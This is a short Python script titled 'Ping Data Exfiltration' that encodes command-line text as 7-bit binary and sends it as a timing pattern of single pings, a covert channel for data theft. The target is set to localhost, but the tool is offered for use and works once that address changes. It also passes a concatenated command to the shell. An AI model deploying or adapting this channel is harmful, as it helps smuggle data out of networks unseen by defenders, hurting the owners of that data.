"""
Ping Data Exfiltration
This script will allow you to convert data into pings, like morse code
Martino Jones 20180105

space is 111
"""

#from os import system, subprocess
import subprocess
from sys import argv
from time import sleep


ipToPing = "127.0.0.1"
dataArray = []


def main():
    print("Encoding data")

    # Convert the data into numbers
    for args in argv[1:]:
        # Split the data by character and add to our dataArray
        for line in args:
            for entry in line:
                # Make sure everything is a number, convert if not
                dataArray.append(''.join(s for s in iter_bin(entry)))
    ping(dataArray)


def iter_bin(s):
    sb = s.encode('ascii')
    return (format(b, '07b') for b in sb)


def ping(data):
    for line in data:
        for char in line:
            subprocess.call(["ping -c 1 " + ipToPing], shell=True)
            #system("ping -c 1 " + ipToPing)
            sleep(int(char))
    subprocess.call(["ping -c 1 " + ipToPing], shell=True)
    print(dataArray)


if __name__ == '__main__':
    main()
